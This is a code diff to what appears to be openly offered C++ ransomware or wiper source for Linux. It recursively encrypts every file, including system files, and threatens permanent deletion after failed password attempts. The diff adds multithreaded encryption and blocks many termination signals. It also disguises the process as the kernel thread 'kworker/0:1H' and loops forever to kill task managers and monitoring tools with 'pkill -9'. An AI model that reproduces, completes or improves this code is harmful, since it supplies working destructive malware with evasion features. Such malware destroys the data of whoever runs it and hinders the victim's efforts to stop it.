@@ -1,10 +1,27 @@
+// Developed by Colton Silva 2025
+// 
+//
+// WARNING: This single file contains c++ source code that
+// can destroy Linux system by encrypting all files
+// (including system files) and deleting them automatically
+// if you enter incorrect password at it's given attempt times
+
+// This software can alter or modify the system's operation
+// which is, to block signals from preventing this from running
+
+
 #include <iostream>
 #include <fstream>
 #include <cstring>
 #include <vector>
 #include <filesystem>
 #include <thread>
+#include <stdlib.h>
+#include <fcntl.h>
 #include <sys/prctl.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <signal.h>
 #include <sys/stat.h>
 #include <unistd.h>
 #include <chrono>
@@ -12,6 +29,11 @@
 #include <openssl/rand.h>
 #include <map>
 #include <csignal>
+#include <mutex>
+#include <condition_variable>
+#include <queue>
+#include <atomic>
+#include <string.h>
 
 using namespace std;
 namespace fs = std::filesystem;
@@ -98,6 +120,14 @@ void processFile(const string &inputFile, const string &outputFile, const string
 }
 
 void encryptDirectory(const fs::path &dirPath, map<string, string> &fileMap, int &counter) {
+    const int MAX_THREADS = 4; // Limit concurrent threads
+    vector<thread> threadPool;
+    mutex mtx;
+    atomic<int> activeThreads(0);
+    condition_variable cv;
+
+    vector<pair<string, string>> filesToEncrypt;
+
     for (const auto &entry : fs::recursive_directory_iterator(dirPath)) {
         if (entry.is_regular_file()) {
             string filePath = entry.path().string();
@@ -108,9 +138,29 @@ void encryptDirectory(const fs::path &dirPath, map<string, string> &fileMap, int
             if (fileName.size() > 4 && fileName.substr(0, 4) == "null") continue;
 
             string encryptedFile = "null" + to_string(counter++);
-            processFile(filePath, encryptedFile, HARDCODED_PASSWORD, true, fileMap);
-            fileMap[encryptedFile] = relativePath; // Store relative path
+            filesToEncrypt.push_back({filePath, encryptedFile});
+            fileMap[encryptedFile] = relativePath;
         }
+    }
+
+    for (auto &[filePath, encryptedFile] : filesToEncrypt) {
+        unique_lock<mutex> lock(mtx);
+        cv.wait(lock, [&] { return activeThreads < MAX_THREADS; });
+
+        activeThreads++;
+        threadPool.emplace_back([&, filePath, encryptedFile]() {
+            processFile(filePath, encryptedFile, HARDCODED_PASSWORD, true, fileMap);
+            {
+                lock_guard<mutex> guard(mtx);
+                activeThreads--;
+            }
+            cv.notify_all();
+        });
+    }
+
+    // Wait for all threads to finish
+    for (auto &t : threadPool) {
+        if (t.joinable()) t.join();
     }
 }
 
@@ -178,28 +228,53 @@ void startEncryption() {
 
 // Immortality
 void signalHandler(int signum) {
-    cout << "Attempted to terminate process! Ignored." << endl;
+    cout << "\n\033[1;31m[BLOCKED]\033[0m Attempted to terminate process! Ignored.\n" << endl;
 }
 
 void setupProtection() {
-    signal(SIGTERM, signalHandler);
-    signal(SIGKILL, signalHandler);
-    signal(SIGSTOP, signalHandler);
+    signal(SIGHUP, signalHandler);     // Terminal hangup
+    signal(SIGINT, signalHandler);     // Ctrl+C
+    signal(SIGQUIT, signalHandler);    // Ctrl+\ //
+    signal(SIGILL, signalHandler);     // Illegal instruction
+    signal(SIGABRT, signalHandler);    // Abort signal
+    signal(SIGFPE, signalHandler);     // Floating point exception
+    signal(SIGSEGV, signalHandler);    // Segmentation fault
+    signal(SIGPIPE, signalHandler);    // Broken pipe
+    signal(SIGALRM, signalHandler);    // Timer signal
+    signal(SIGTERM, signalHandler);    // Termination request
+    signal(SIGUSR1, signalHandler);    // User-defined signal 1
+    signal(SIGUSR2, signalHandler);    // User-defined signal 2
+    signal(SIGTSTP, signalHandler);    // Ctrl+Z (suspend)
+    signal(SIGTTIN, signalHandler);    // Background process read
+    signal(SIGTTOU, signalHandler);    // Background process write
+    signal(SIGXCPU, signalHandler);    // CPU time limit exceeded
+    signal(SIGXFSZ, signalHandler);    // File size limit exceeded
+    signal(SIGVTALRM, signalHandler);  // Virtual alarm
+    signal(SIGPROF, signalHandler);    // Profiling timer expired
     prctl(PR_SET_NAME, "kworker/0:1H", 0, 0, 0);
 }
 
-/*void daemonize() {
-    pid_t pid = fork();
-    if (pid > 0) exit(0); // Parent exits
-    if (pid < 0) exit(1); // Fork failed
+// I decided to merge task managers and power session control in this function but these have the same goal, to prevent execution that may intterupt on this program
 
-    umask(0);
-    setsid();
-    chdir("/");
-    close(STDIN_FILENO);
-    close(STDOUT_FILENO);
-    close(STDERR_FILENO);
-}*/
+void monitorAndKillTaskManagers() {
+    const vector<string> taskManagers = {
+    //typical task manager
+        "htop", "btop", "top", "atop", "gtop",
+        "vtop", "bashtop", "glances", "ksysguard", "gnome-system-monitor",
+        "xfce4-taskmanager", "lxtask", "taskmgr", "resmon", // cross-platform naming
+        "kSysGuard", "mate-system-monitor", "nmon", "bpytop", "conky",
+        "perf", "iotop", "ps_mem", "nmon"
+  
+    };
+
+    while (true) {
+        for (const auto &proc : taskManagers) {
+        string cmd = "pkill -9 -f \"" + proc + "\" > /dev/null 2>&1";
+            system(cmd.c_str());
+        }
+        this_thread::sleep_for(chrono::milliseconds(500));
+    }
+}
 
 void encryptAllFiles();
 void decryptAllFiles();
@@ -223,17 +298,20 @@ void watchdog() {
 }
 
 
-
 int main() {
 
-
     if (!fs::exists(MAP_FILE)) {
+      
+    setupProtection();
+    thread antiMonitor(monitorAndKillTaskManagers);
+    antiMonitor.detach(); // Keeps it running in background
 
-        signal(SIGINT, ignoreSignals);  // Prevents Ctrl+C
-        signal(SIGTSTP, ignoreSignals); // Prevents Ctrl+Z
-        signal(SIGKILL, ignoreSignals); // Prevents other termination signal
-        signal(SIGSTOP, ignoreSignals);
-        signal(SIGTERM, ignoreSignals);
+
+     //   signal(SIGINT, ignoreSignals);  // Prevents Ctrl+C
+      //  signal(SIGTSTP, ignoreSignals); // Prevents Ctrl+Z
+     //   signal(SIGKILL, ignoreSignals); // Prevents other termination signal
+     //   signal(SIGSTOP, ignoreSignals);
+    //    signal(SIGTERM, ignoreSignals);
        // daemonize();
         //setupProtection();
         //watchdog();
@@ -251,13 +329,12 @@ int main() {
 
         this_thread::sleep_for(chrono::seconds(3));
 
-        cout << "Null-ng files..." << endl;
+        cout << "Null-ng files...\n" << endl;
 
     // Wait for encryption to complete
         encryptionThread.join();
-        cout << "\nNow you need to enter password to restore your files into it's original state. You have 50 attempts. If you entered incorrect password 50 times, all of the infected files will be delete permanently." << endl;
         decryptAllFiles();
-        return 0;
+        return 0; 
     }
 
     else {
